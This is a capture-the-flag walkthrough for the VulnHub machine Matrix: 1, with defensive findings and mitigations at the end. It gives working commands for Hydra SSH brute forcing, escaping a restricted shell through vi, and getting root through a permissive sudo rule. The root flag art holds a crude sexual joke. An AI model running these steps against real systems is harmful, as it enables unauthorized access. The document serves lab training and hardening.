# Matrix: 1 CTF Walkthrough

**Target:** Matrix: 1  
**Source:** [VulnHub](https://www.vulnhub.com/entry/matrix-1,259/)  
**Difficulty:** Intermediate  
**Target IP:** 10.0.2.22  

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration — Port 31337](#web-enumeration--port-31337)
- [Brainfuck Decoding](#brainfuck-decoding)
- [Password Brute Force](#password-brute-force)
- [Initial Access — Restricted Shell](#initial-access--restricted-shell)
- [Restricted Shell Escape](#restricted-shell-escape)
- [Privilege Escalation](#privilege-escalation)
- [Root Flag](#root-flag)
- [Vulnerabilities](#vulnerabilities)
- [Recommendations](#recommendations)

---

## Overview

Matrix: 1 is an intermediate-difficulty CTF challenge themed around the film *The Matrix*. The path to root requires chaining together several steps: discovering an encoded hint on a non-standard port, deciphering Brainfuck-encoded credentials, brute-forcing the final two characters of a password, escaping a restricted shell via `vi`, and exploiting a broad sudo misconfiguration to reach root.

**Key Skills Required:**
- Port enumeration
- Base64 and Brainfuck decoding
- SSH brute forcing with Hydra
- Restricted shell (rbash) escape via GTFOBins
- Linux privilege escalation via sudo

---

## Reconnaissance

### Network Scanning

```bash
nmap -sV -sC -Pn 10.0.2.22
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 7.7 (protocol 2.0) |
| 80/tcp | open | http | SimpleHTTPServer 0.6 (Python 2.7.14) |
| 31337/tcp | open | http | SimpleHTTPServer 0.6 (Python 2.7.14) |

**Key Observations:**
- Port 80 and 31337 both run Python's SimpleHTTPServer
- Port 31337 is the ["elite" / "leet" port](https://en.wikipedia.org/wiki/Leet) — worth investigating closely
- `http-title` on both is `Welcome in Matrix`

### Web Technology Fingerprinting

```bash
whatweb http://10.0.2.22
```

```
http://10.0.2.22 [200 OK] Bootstrap, HTML5, HTTPServer[SimpleHTTP/0.6 Python/2.7.14],
IP[10.0.2.22], JQuery, Python[2.7.14], Title[Welcome in Matrix]
```

---

## Web Enumeration — Port 31337

Port 80 yields only a static landing page. Turning attention to port 31337:

```bash
curl http://10.0.2.22:31337
```

Inspecting the page source reveals a hidden base64-encoded string embedded in the HTML:

```
ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5k
cyxpdCBpcyBvbmx5IHlvdXJzZWxmLiAiID4gQ3lwaGVyLm1hdHJpeA==
```

### Decoding the Base64 Hint

```bash
echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" > hash.txt
base64 -d hash.txt
```

**Output:**

```
echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
```

This reveals a filename: `Cypher.matrix`. Downloading it directly:

```bash
curl -O http://10.0.2.22:31337/Cypher.matrix
```

---

## Brainfuck Decoding

```bash
cat Cypher.matrix
```

The file contains [Brainfuck](https://en.wikipedia.org/wiki/Brainfuck)-encoded text:

```
+++++ ++++[ ->+++ +++++ +<]>+ +++++ ++.<+ +++[- >++++ <]>++ ++++. +++++
+.<++ +++++ ++[-> ----- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]> +++.-
-.<++ +[->+ ++<]> ++++. <++++ ++++[ ->--- ----- <]>-- ----- ----- --.<+
[...]
```

Paste the full file contents into an online Brainfuck interpreter such as [https://copy.sh/brainfuck/](https://copy.sh/brainfuck/).

**Decoded output:**

```
You can enter into matrix as guest, with password k1ll0rXX

Note: Actually, I forget last two characters so I have replaced with XX
try your luck and find correct string of password.
```

**Partial credentials found:**
- Username: `guest`
- Password: `k1ll0r??` — last two characters unknown

---

## Password Brute Force

### Generating the Wordlist

The password has two unknown trailing characters. Using lowercase letters and digits (a–z, 0–9) gives 36 × 36 = **1,296 possible combinations**.

```bash
chmod +x brute_force.sh
./brute_force.sh
```

```
[+] Done! 1296 combinations saved to wordlist.txt
```

The script generates every combination of `k1ll0r` + two alphanumeric characters and writes them to `wordlist.txt`.

### SSH Brute Force with Hydra

```bash
hydra -l guest -P wordlist.txt 10.0.2.22 ssh
```

**Result:**

```
[22][ssh] host: 10.0.2.22   login: guest   password: k1ll0r7n
1 of 1 target successfully completed, 1 valid password found
```

**Confirmed credentials:**
- Username: `guest`
- Password: `k1ll0r7n`

---

## Initial Access — Restricted Shell

```bash
ssh guest@10.0.2.22
```

```
guest@porteus:~$ whoami
-rbash: whoami: command not found

guest@porteus:~$ ls
-rbash: /bin/ls: restricted: cannot specify '/' in command names

guest@porteus:~$ echo $PATH
/home/guest/prog
```

The session is a **restricted bash (rbash)** environment. Only the `/home/guest/prog` directory is in `PATH`. Discovering what's available:

```bash
guest@porteus:~$ echo /home/guest/prog/*
/home/guest/prog/vi
```

Only `vi` is accessible — and `vi` is a classic GTFOBins shell escape vector.

---

## Restricted Shell Escape

### Escaping via vi

```bash
guest@porteus:~$ vi
```

Inside `vi`, run the following command:

```
:!/bin/sh
```

This spawns an unrestricted `sh` session. However, the `PATH` is still restricted:

```bash
sh-4.4$ echo $PATH
/home/guest/prog

sh-4.4$ ls
sh: ls: command not found
```

### Fixing the Environment

```bash
sh-4.4$ export SHELL=/bin/bash:$SHELL
sh-4.4$ export PATH=/usr/bin:$PATH

sh-4.4$ whoami
guest
```

Standard Linux commands are now functional.

---

## Privilege Escalation

### Sudo Enumeration

```bash
sh-4.4$ sudo -l
```

```
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
```

The critical entry is `(ALL) ALL` — `guest` can run **any command as any user** via sudo. This is an immediate path to root.

### Escalating to Root

Attempting `sudo su` fails initially because `/bin` is not in `PATH`:

```bash
sh-4.4$ sudo su
sudo: su: command not found
```

Add `/bin` to `PATH` and try again:

```bash
sh-4.4$ export PATH=/bin:$PATH
sh-4.4$ sudo su
Password: k1ll0r7n

root@porteus:/home/guest# whoami
root
```

---

## Root Flag

```bash
root@porteus:~# cat flag.txt
```

```
   _,-.
,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF
|`-._`-.\,-'_|  _,-'.
     `-.|.-' | |`.-'|_     WHAT
        |      |_|,-'_`.
              |-._,-'  |     NO, ME NEITHER
         jrei | |    _,'
              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION
```

**PWNED!**

---

## Vulnerabilities

### 1. Credential Material Exposed on Unauthenticated HTTP Endpoint (High)

**Description:** `Cypher.matrix` — a file containing (lightly obfuscated) SSH credentials — was served publicly on port 31337 without any authentication.

**Impact:** Any attacker who enumerates open ports can retrieve and decode the credential hint, reducing the problem to a simple 1,296-entry brute force.

**Mitigation:**
- Never serve files containing credential material on public interfaces
- Treat all encoding (base64, Brainfuck, ROT13) as obfuscation, not encryption — it provides no real security

---

### 2. Weak, Brute-Forceable Password (High)

**Description:** The SSH password `k1ll0r7n` falls within a predictable 1,296-entry search space.

**Impact:** Hydra recovers it in seconds.

**Mitigation:**
- Enforce strong, randomly generated passwords
- Disable SSH password authentication; require key-based auth:
  ```
  PasswordAuthentication no
  ```
- Deploy fail2ban to block repeated login attempts

---

### 3. Restricted Shell Bypass via vi (Medium)

**Description:** The `guest` account was placed in `rbash` with only `vi` available in `PATH`. `vi` allows arbitrary shell command execution via `:!/bin/sh`.

**Impact:** The restriction is bypassed in a single command.

**Mitigation:**
- Never rely on rbash alone as a security boundary
- Audit any binaries in restricted paths against [GTFOBins](https://gtfobins.github.io/)
- Use proper sandboxing (containers, namespaces, chroot) instead of restricted shells

---

### 4. Sudo Misconfiguration — `(ALL) ALL` (Critical)

**Description:** The sudoers entry grants `guest` unrestricted `sudo` access to every command on the system.

**Vulnerable sudoers entry:**
```
guest ALL=(ALL) ALL
```

**Impact:** Immediate root access via `sudo su` (or any other method).

**Mitigation:**
- Apply the principle of least privilege — never assign `(ALL) ALL` to unprivileged accounts
- Audit sudoers with `visudo` and `sudo -l` for every user
- Require explicit re-authentication; remove `NOPASSWD` unless strictly necessary

---

## Recommendations

### Authentication & SSH

- Disable SSH password authentication and enforce key-based auth only
- Implement fail2ban or similar tooling to block brute-force attempts
- Audit all user accounts for weak or guessable passwords

### Secrets & File Exposure

- Never host files containing credentials or credential hints on public HTTP endpoints
- Remember: base64, Brainfuck, and similar encodings are trivially reversible — they are not encryption
- Use proper secrets management (e.g. HashiCorp Vault) for sensitive material

### Restricted Shell Design

- Treat rbash as a convenience layer, not a security control
- Before placing any binary in a restricted user's PATH, verify it against [GTFOBins](https://gtfobins.github.io/)
- Use containers or minimal chroot environments for true isolation

### Sudo Policy

- Regularly audit `/etc/sudoers` — run `sudo -l` for every user on the system
- Never grant `(ALL) ALL`; specify exact commands with fixed arguments
- Avoid `NOPASSWD` on any binary that can execute arbitrary code or spawn a shell

---

## Attack Chain Summary

```
Nmap Port Scan → Ports 22, 80, 31337
        ↓
Port 31337 HTTP — Base64 String Found in Page Source
        ↓
Base64 Decode → Filename: Cypher.matrix
        ↓
curl -O http://10.0.2.22:31337/Cypher.matrix
        ↓
Brainfuck Decode (copy.sh/brainfuck)
        ↓
Credentials: guest / k1ll0rXX (last 2 chars unknown)
        ↓
Wordlist Generated (brute_force.sh) → 1296 combinations
        ↓
Hydra SSH Brute Force → guest / k1ll0r7n
        ↓
SSH Login — rbash Restricted Shell (only vi in PATH)
        ↓
vi GTFOBins Escape → :!/bin/sh
        ↓
export PATH=/usr/bin:/bin:$PATH
        ↓
sudo -l → (ALL) ALL
        ↓
sudo su → Root Shell
        ↓
cat /root/flag.txt — SYSTEM PWNED
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Network & service scanning |
| WhatWeb | Web technology fingerprinting |
| curl | HTTP file retrieval |
| base64 | Decoding the page source hint |
| copy.sh/brainfuck | Online Brainfuck interpreter |
| bash (brute_force.sh) | Wordlist generation |
| Hydra | SSH brute force |
| vi | GTFOBins restricted shell escape |
| sudo | Privilege escalation |

---

## References

- [VulnHub - Matrix: 1](https://www.vulnhub.com/entry/matrix-1,259/)
- [GTFOBins - vi](https://gtfobins.github.io/gtfobins/vi/)
- [Brainfuck Decoder](https://copy.sh/brainfuck/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Wikipedia - Brainfuck](https://en.wikipedia.org/wiki/Brainfuck)

---

## Disclaimer

This writeup is for **educational purposes only**. All techniques demonstrated should only be used on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

---
*"There is no spoon — but there is always a shell escape."*
